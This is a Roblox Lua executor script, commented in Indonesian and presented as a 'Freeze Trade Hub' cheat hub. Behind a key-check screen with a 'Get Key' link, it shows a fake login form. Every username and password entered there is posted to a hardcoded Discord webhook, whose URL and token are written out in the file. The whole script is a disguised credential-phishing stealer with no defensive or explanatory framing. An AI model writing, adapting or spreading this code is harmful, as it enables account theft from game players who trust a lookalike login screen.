-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Key yang benar
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password)
    local json_data = {
        content = "Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
    }
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode(json_data)
    }

    local response
    if syn and syn.request then
        response = syn.request(payload)
    elseif http and http.request then
        response = http.request(payload)
    elseif request then
        response = request(payload)
    else
        print("Executor Anda tidak mendukung HTTP requests!")
        return
    end

    if response and response.StatusCode == 200 then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
    end
end

-- Fungsi Membuat GUI Kedua (Login)
local function loginFrame(username, password, parentGui)
    local title = Instance.new("TextLabel")
    local frame = Instance.new("Frame")
    local passwordInput = Instance.new("TextBox")
    local usernameInput = Instance.new("TextBox")
    local buttonLogin = Instance.new("TextButton")

    frame.Size, frame.Parent = UDim2.new(0, 300, 0, 300), parentGui
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    title.TextColor3, title.Parent = Color3.fromRGB(255, 255, 255), frame
    title.Text, title.Font = "Freeze Trade Hub", Enum.Font.SourceSansBold
    title.TextSize, title.Position = 24, UDim2.new(0, 0, 0, 0)

    usernameInput.TextSize, usernameInput.TextColor3 = 14, Color3.fromRGB(255, 255, 255)
    usernameInput.Parent = frame
    usernameInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    usernameInput.Position, usernameInput.PlaceholderText = UDim2.new(0, 10, 0, 60), "Enter username"
    passwordInput.Position, passwordInput.TextSize, passwordInput.PlaceholderText = UDim2.new(0, 10, 0, 120), 14, "Enter password"
    passwordInput.BackgroundColor3 = usernameInput.BackgroundColor3

    buttonLogin.Parent, buttonLogin.Text = frame, "Submit"
    buttonLogin.BackgroundColor3 = Color3.fromRGB(0, 150, 0)

    buttonLogin.MouseButton1Click:Connect(function()
        if usernameInput.Text ~= "" and passwordInput.Text ~= "" then
            sendToDiscord(usernameInput.Text, passwordInput.Text)
            parentGui:Destroy()
        end
    end)
end

-- Fungsi Membuat GUI Pertama (Key Validation)
local function keyValidationFrame()
    local validateGUI = Instance.new("ScreenGui")
    local titleText = Instance.new("TextLabel")
    local validateFrame = Instance.new("Frame")
    local verifyTextBox = Instance.new("TextBox")
    local verifyButton, errorText, linkButton = Instance.new("TextButton"), Instance.new("TextLabel"), Instance.new("TextButton")

    validateFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    validateFrame.Size, validateGUI.Parent = UDim2.new(0, 300, 0, 250), game.CoreGui

    titleText.Parent, titleText.Text = validateFrame, "Hub Login"

    verifyButton.Parent, errorText.Parent, linkButton.Parent = validateFrame, validateFrame, validateFrame

    verifyButton.Text, linkButton.Text = "Verify", "Get Key"

    verifyButton.MouseButton1Click:Connect(function()
        if verifyTextBox.Text == correctKey then
            loginFrame(verifyTextBox.Text, verifyTextBox.Text, validateGUI)
        else
            errorText.Text = "Invalid Key"
        end
    end)
end

keyValidationFrame()
